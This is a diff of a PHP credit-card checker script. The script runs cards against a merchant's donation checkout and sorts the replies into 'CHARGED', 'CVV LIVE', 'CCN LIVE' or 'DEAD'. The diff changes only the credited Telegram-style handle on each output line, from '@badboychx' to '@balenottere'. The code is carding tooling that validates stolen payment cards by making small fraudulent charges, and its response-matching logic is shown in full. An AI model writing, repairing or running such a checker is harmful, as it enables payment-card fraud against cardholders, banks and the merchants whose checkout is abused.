@@ -284,143 +284,143 @@ if(strpos($fim, '"type":"credit"') !== false) {
   }
   if
   (strpos($result2,  '"cvc_check": "pass"')) {
-    echo   "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CVV LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo   "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CVV LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  "Thank you. Your order has been received.")) {
-    echo  "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo  "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   elseif
   (strpos($result2,  'result":"OK')) {
-    echo "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  "Thank You.")) {
-    echo "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  'Your card zip code is incorrect.')) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[APPROVED CVV]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[APPROVED CVV]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   } 
   elseif
   (strpos($result2,  '/donations/thank_you?donation_number=','')) {
-    echo "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  "incorrect_zip")) {
-    echo"CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[APPROVED CVV]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo"CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[APPROVED CVV]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  '"type":"one-time"')) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[APPROVED CVV]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[APPROVED CVV]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  'security code is incorrect.')) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  'security code is invalid.')) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INVALID CVC]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INVALID CVC]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  'Your card&#039;s security code is incorrect.')) {
-    echo"CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo"CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  "incorrect_cvc")) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->CCN LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->CCN LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   
   elseif
   (strpos($result2,  'Your card has insufficient funds.')) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   
   
   elseif
   (strpos($result2,  "insufficient_funds")) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  '"cvc_check": "fail"')) {
-    echo  "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo  "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  'security code is invalid.')) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  'Your card&#039;s security code is incorrect.')) {
-    echo"CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo"CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  "incorrect_cvc")) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   
   
   elseif
   (strpos($result2,  'Your card has insufficient funds.')) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   
   
   elseif
   (strpos($result2,  "insufficient_funds")) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  'Your card has expired.')) {
-    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card has expired.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card has expired.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  'Your card number is incorrect.')) {
-    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card number is incorrect.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card number is incorrect.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   elseif
   (strpos($result2,  "incorrect_number")) {
-    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[incorrect_number]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[incorrect_number]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  'card was declined.')) {
-     echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[card was declined.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+     echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[card was declined.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  "do_not_honor")) {
-    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card was declined.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card was declined.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  "do_not_honor")) {
-    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[do_not_honor]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[do_not_honor]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   
   
   elseif
   (strpos($result2,  'Your card does not support this type of purchase.')) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[Your card does not support this type of purchase.]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[Your card does not support this type of purchase.]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   
@@ -428,19 +428,19 @@ if(strpos($fim, '"type":"credit"') !== false) {
   
   elseif
   (strpos($result2,  "transaction_not_allowed")) {
-    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[transaction_not_allowed]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[transaction_not_allowed]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   
   
   elseif
   (strpos($result2,  'card was declined.')) {
-    echo  "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card was declined.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo  "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card was declined.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   elseif
   (strpos($result2,  "generic_decline")) {
-    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[generic_decline]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[generic_decline]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   
@@ -448,11 +448,11 @@ if(strpos($fim, '"type":"credit"') !== false) {
   
   elseif 
   (strpos($result2,  '-1')) {
-    echo  "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[UPDATE NONCE ]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo  "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[UPDATE NONCE ]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
   else {
-    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card was declined.{due to unknoen earror}]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card was declined.{due to unknoen earror}]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @balenottere]<b></span>  </br>";
   }
   
         
